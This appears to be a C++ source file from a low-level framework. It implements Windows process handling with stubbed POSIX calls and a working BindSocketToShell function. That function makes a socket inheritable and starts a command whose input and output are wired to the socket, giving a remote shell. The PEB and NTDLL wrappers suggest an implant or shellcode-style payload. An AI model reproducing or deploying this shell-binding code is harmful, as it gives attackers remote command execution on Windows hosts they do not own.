/**
 * process.cc - Windows Process Execution Implementation
 *
 * Provides process creation with socket redirection via NTDLL.
 *
 * NOTE: Windows process creation with socket handle redirection is complex.
 * This implementation uses CreateProcessW with redirected standard handles.
 */

#include "platform/system/process.h"
#include "platform/common/windows/ntdll.h"
#include "platform/common/windows/kernel32.h"
#include "core/memory/memory.h"
#include "platform/common/windows/peb.h"

// Process creation structures for Windows
struct PS_ATTRIBUTE
{
	USIZE Attribute;
	USIZE Size;
	union
	{
		USIZE Value;
		PVOID ValuePtr;
	};
	PUSIZE ReturnLength;
};

struct PS_ATTRIBUTE_LIST
{
	USIZE TotalLength;
	PS_ATTRIBUTE Attributes[2];
};

struct PS_CREATE_INFO
{
	USIZE Size;
	USIZE State;
	union
	{
		struct
		{
			union
			{
				UINT32 InitFlags;
				struct
				{
					UINT8 WriteOutputOnExit : 1;
					UINT8 DetectManifest : 1;
					UINT8 IFEOSkipDebugger : 1;
					UINT8 IFEODoNotPropagateKeyState : 1;
					UINT8 SpareBits1 : 4;
					UINT8 SpareBits2 : 8;
					UINT16 ProhibitedImageCharacteristics;
				};
			};
			UINT32 AdditionalFileAccess;
		} InitState;

		struct
		{
			PVOID FileHandle;
		} FailSection;

		struct
		{
			UINT16 DllCharacteristics;
		} ExeFormat;

		struct
		{
			PVOID IFEOKey;
		} ExeName;

		struct
		{
			union
			{
				UINT32 OutputFlags;
				struct
				{
					UINT8 ProtectedProcess : 1;
					UINT8 AddressSpaceOverride : 1;
					UINT8 DevOverrideEnabled : 1;
					UINT8 ManifestDetected : 1;
					UINT8 ProtectedProcessLight : 1;
					UINT8 SpareBits1 : 3;
					UINT8 SpareBits2 : 8;
					UINT16 SpareBits3;
				};
			};
			PVOID FileHandle;
			PVOID SectionHandle;
			UINT64 UserProcessParametersNative;
			UINT32 UserProcessParametersWow64;
			UINT32 CurrentParameterFlags;
			UINT64 PebAddressNative;
			UINT32 PebAddressWow64;
			UINT64 ManifestAddress;
			UINT32 ManifestSize;
		} SuccessState;
	};
};

// Windows doesn't have fork() - use stub implementation
Result<SSIZE, Error> Process::Fork() noexcept
{
	// Windows doesn't support fork()
	return Result<SSIZE, Error>::Err(Error::Process_ForkFailed);
}

// Windows doesn't have dup2 in the same way - stub
Result<SSIZE, Error> Process::Dup2(SSIZE oldfd, SSIZE newfd) noexcept
{
	(void)oldfd;
	(void)newfd;
	return Result<SSIZE, Error>::Err(Error::Process_Dup2Failed);
}

// Windows doesn't have execve - stub
Result<SSIZE, Error> Process::Execve(const CHAR *pathname, CHAR *const argv[], CHAR *const envp[]) noexcept
{
	(void)pathname;
	(void)argv;
	(void)envp;
	return Result<SSIZE, Error>::Err(Error::Process_ExecveFailed);
}

// Windows doesn't have setsid - stub
Result<SSIZE, Error> Process::Setsid() noexcept
{
	return Result<SSIZE, Error>::Err(Error::Process_SetsidFailed);
}

Result<SSIZE, Error> Process::BindSocketToShell(SSIZE socketFd, const CHAR *cmd) noexcept
{
	if (socketFd < 0 || !cmd)
		return Result<SSIZE, Error>::Err(Error::Process_BindShellFailed);

	PVOID h = (PVOID)(USIZE)socketFd;

	// 1. CRITICAL: Make the handle inheritable
	auto handleResult = Kernel32::SetHandleInformation(h, 1 /*HANDLE_FLAG_INHERIT*/, 1);
	if (handleResult.IsErr())
		return Result<SSIZE, Error>::Err(handleResult, Error::Process_BindShellFailed);

	STARTUPINFOW si = {};
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdInput = h;
	si.hStdOutput = h;
	si.hStdError = h;

	PROCESS_INFORMATION pi = {};
	WCHAR cmdWide[260];
	StringUtils::Utf8ToWide(Span<const CHAR>(cmd, StringUtils::Length(cmd)), Span<WCHAR>(cmdWide, 260));

	auto createResult = Kernel32::CreateProcessW(
			nullptr, cmdWide, nullptr, nullptr,
			true, // inherit handles
			0, nullptr, nullptr, &si, &pi);

	if (createResult.IsErr())
	{
		return Result<SSIZE, Error>::Err(createResult, Error::Process_BindShellFailed);
	}

	// 2. Close handles to prevent leaks
	(void)NTDLL::ZwClose(pi.hThread);
	(void)NTDLL::ZwClose(pi.hProcess);

	return Result<SSIZE, Error>::Ok(0);
}
